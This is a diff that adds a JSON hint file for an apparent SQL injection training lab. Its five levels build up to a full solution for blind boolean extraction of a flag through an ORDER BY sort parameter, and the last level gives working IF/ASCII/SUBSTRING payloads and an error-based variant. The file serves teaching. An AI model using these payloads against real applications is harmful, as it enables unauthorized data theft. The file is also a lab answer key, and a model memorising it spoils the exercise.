@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-07-order-by",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "Click the column headers to sort. Notice how the URL changes? The sort parameter controls which column the results are ordered by."
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "You can't use UNION in ORDER BY, but you can use expressions like IF() or CASE. If you can make the sort order change based on a condition, you have a data channel."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "Try: IF(1=1, username, score) as the sort value. If the results sort by username when the condition is true and by score when false, you can use this to ask yes/no questions about the database."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "Use: IF(ASCII(SUBSTRING((SELECT value FROM flag_store LIMIT 1),1,1))>64, username, score) — compare sort orders to binary-search each character of the flag."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "For each character position N: send ?sort=IF(ASCII(SUBSTRING((SELECT value FROM flag_store LIMIT 1),{N},1))>{mid}, username, score). Compare the sort order of results. If sorted by username, the condition is true (char > mid). Binary search to find each character. Alternatively, use error-based via: (SELECT IF(ASCII(SUBSTRING((SELECT value FROM flag_store LIMIT 1),1,1))>64, 1, (SELECT table_name FROM information_schema.tables))) to force an error as signal."
+    }
+  ]
+}
